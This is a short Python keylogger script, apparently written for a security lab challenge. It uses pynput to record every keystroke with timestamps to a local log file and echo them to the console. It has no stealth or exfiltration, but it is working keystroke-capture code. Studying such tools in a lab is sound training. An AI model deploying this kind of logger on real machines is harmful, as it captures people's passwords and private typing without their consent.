"""
Windows Keylogger for Immersive Lab Challenge
Captures keyboard input and saves to a log file
"""

from pynput import keyboard
import logging
from datetime import datetime
import os

# Setup logging
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Configure logging to write to file
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

print(f"[*] Keylogger started")
print(f"[*] Logging to: {log_file}")
print(f"[*] Press Ctrl+C to stop\n")

# Track special keys
def on_press(key):
    try:
        # Regular character keys
        char = key.char
        logging.info(f"Key pressed: {char}")
        print(char, end='', flush=True)
    except AttributeError:
        # Special keys (space, enter, etc.)
        key_name = str(key).replace('Key.', '')
        logging.info(f"Special key: {key_name}")

        if key == keyboard.Key.space:
            print(' ', end='', flush=True)
        elif key == keyboard.Key.enter:
            print('\n', end='', flush=True)
        elif key == keyboard.Key.tab:
            print('\t', end='', flush=True)
        else:
            print(f"[{key_name}]", end='', flush=True)

def on_release(key):
    # Stop listener with Ctrl+C (handled by KeyboardInterrupt)
    if key == keyboard.Key.esc:
        print("\n[*] ESC pressed - stopping keylogger")
        return False

# Start listening to keyboard events
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[*] Keylogger stopped by user")

print(f"\n[*] Log saved to: {log_file}")
